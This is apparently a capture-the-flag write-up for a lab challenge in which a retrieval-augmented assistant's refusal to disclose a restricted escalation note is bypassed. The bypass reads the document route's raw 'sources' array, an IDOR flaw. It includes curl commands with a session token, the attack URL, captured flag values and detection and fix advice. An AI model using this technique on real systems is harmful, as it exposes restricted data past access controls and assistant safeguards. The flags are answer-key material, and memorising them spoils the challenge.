# K21.3 — The answer it should withhold

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** pi lane K21

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Retrieval-citation disclosure — the document route returns the full source text a restricted answer was built from, so the guardrail is bypassed by reading its evidence instead of its output |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET https://assistant.keplerops.test/api/contexts/ctx-support-private-v4/conversations/CONV-SUP-2841-19/documents/DOC-RILL-442` |
| **Prerequisite** | The support overlay cookie (`fieldkest_support=fk_support_rowan_…`) and the context/conversation/document ids from K21.1/K21.2 |
| **Flag** | accepted, value not recorded |

**What you are about to read:** why "the assistant refused to answer" is not a security control
when the same API will hand you the sources it would have cited, and how an argument-injection
of document ids turns a polite refusal into the private escalation note. The right mental model
is *read the evidence, not the answer*.

## Objective

> Recover the support engineer's private escalation note about ARWC from the assistant's case
> context, although the assistant's ordinary support role should withhold it.

The note is `ESC-SUP-2841-R3.md`, marked restricted, written by the engineer handling the ARWC
callback-latency case. The assistant, asked directly, is supposed to refuse.

## Background you need

A retrieval-augmented assistant answers in two parts:

```
answer  = model(citations)
sources = [ { "'text'": <full document text>, "reference": <file> }, … ]
```

The `sources` array exists so the UI can render "where this came from". It is populated from the
retrieval layer **before** the model applies any policy. Consequences:

- The `answer` can be redacted while `sources` remain raw.
- A document route that serves "the sources for conversation X, document Y" needs its own
  authorization; if it only checks "does the caller have the support overlay", the restriction
  on the note is never evaluated.
- Ids are guessable/deducible (`ctx-…-private-v4`, `CONV-SUP-2841-19`, `DOC-RILL-442`), and the
  assistant's own config/context inventory publishes them (K21.1, K23.1).

Data-flow point: a "policy" that lives in the prompt is a *generation-time* filter. Reading the
citations is a *storage-time* read. They are different trust boundaries, and only one of them
was implemented.

## Walkthrough

### 1. Establish the overlay session

Same trick as K21.2 — the support bearer as a cookie:

```bash
TOKEN=fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b
C='Cookie: fieldkest_support='"${TOKEN}"
```

### 2. Ask the assistant properly first (and watch it refuse)

```bash
curl -sS -H "$C" -H 'Content-Type: application/json' -X POST \
  -d '{"request":"private_escalation","context_id":"ctx-support-private-v4",
       "conversation_id":"CONV-SUP-2841-19","tenant_id":"TEN-ARWC-047"}' \
  https://assistant.keplerops.test/api/answers
# 502 {"error":"retrieval_failed"}

curl -sS -H "$C" -H 'Content-Type: application/json' -X POST \
  -d '{"context_id":"ctx-support-private-v4"}' \
  https://assistant.keplerops.test/api/completions/context
# 403 {"error":"context_ownership_denied"}
```

Both of these *do* enforce something: the answer route fails closed and the completion route
checks ownership. This is the important contrast — the platform has the concept of ownership,
it just does not apply it to the document route.

### 3. Go around the model and read the citations

```bash
curl -sS -H "$C" \
  'https://assistant.keplerops.test/api/contexts/ctx-support-private-v4/conversations/CONV-SUP-2841-19/documents/DOC-RILL-442' \
  | jq '.sources[] | {reference, text}'
```

The response's `sources[]` contains the retrieved documents in full — including
`ESC-SUP-2841-R3.md`, present as **two copies** (the assistant was fed both the original and an
updated version), plus `COMP-JOB-17.md`.

This is the "answer it should withhold": the private escalation note about ARWC is in the
citation list of a conversation the support role is allowed to *open* but not allowed to
*read the contents of*.

### 4. Extract the flag

The updated copy of the note carries the completion token. In the 1:43:16 PM version:

```
Completion token: FLAG{0613dee9e717f1e3}
```

Lane notes record that value for this card and state the submission was accepted; the card
entry stores no flag value.

## Why this works (the vulnerability explained)

**The guardrail is in the wrong layer.** The assistant's policy is text in the prompt: "do not
disclose restricted escalation notes". That constrains the *model's output*. The document route
bypasses the model entirely — it returns the retrieval evidence, which was assembled before any
policy question was asked.

**Authorization is per-route, not per-object.** The route checks "is this a valid support
overlay session for this context/conversation" but never "may this caller read *this document*".
The document id (`DOC-RILL-442`) is just a parameter, and the context it is requested under
(`ctx-support-private-v4`) is a *different* conversation's context — the classic IDOR shape
where the parent id in the URL is validated and the child id is not.

**Why the note exists twice.** Duplicate copies with different timestamps are a normal artefact
of support editing a draft. Both were indexed; both come back. The newer one is the one that
matters, and it is also the one nobody remembered to classify.

The transferable rule: whenever a system separates *generation* from *retrieval*, the
retrieval artefacts (sources, citations, embeddings, cached chunks) inherit the classification
of the most sensitive input and must be authorised independently. "The model refuses" is not an
access control; it is a UX behaviour.

## Detection and fix

- **Log signal:** document-route reads whose `document` id does not appear in the conversation's
  own citation set; reads of restricted notes by support-tier sessions; repeated reads of the
  same document across different contexts (the cross-tenant signature seen in K23.3).
- **Fix:** authorise each document at read time against the caller's role *and* the document's
  classification; strip restricted documents from `sources[]` for non-privileged callers (keep
  the reference, drop the text); resolve documents by opaque capability rather than by id;
  re-classify duplicates on edit.
- **Design:** move policy out of the prompt into the retrieval layer, so the same rule governs
  both the answer and its citations.

## Notes and dead ends

- Working dead ends in the same lane (they show where the checks actually are):
  `POST /api/answers` → `502 retrieval_failed`; `POST /api/completions/context` →
  `403 context_ownership_denied`; `POST /api/tools/accept-duplicate-review` did not yield the
  note either.
- The document route is slow — the lane recorded 30–45 s for a Rillhaven document fetch and 42 s
  for this cross-context one. Budget for timeouts; a short `--max-time` looks like a failure.
- `ESC-SUP-2841-R3.md` also appears in the K17/K19 material as the escalation *reference*. The
  reference and the note body are different objects; this card needs the body.
- `COMP-JOB-17.md` in the same `sources[]` belongs to K24.1 (`FLAG{664724eb7d7073e9}`) — it is
  visible here but not this card's submission. Cross-card flags are the most common wasted
  attempt in this range.
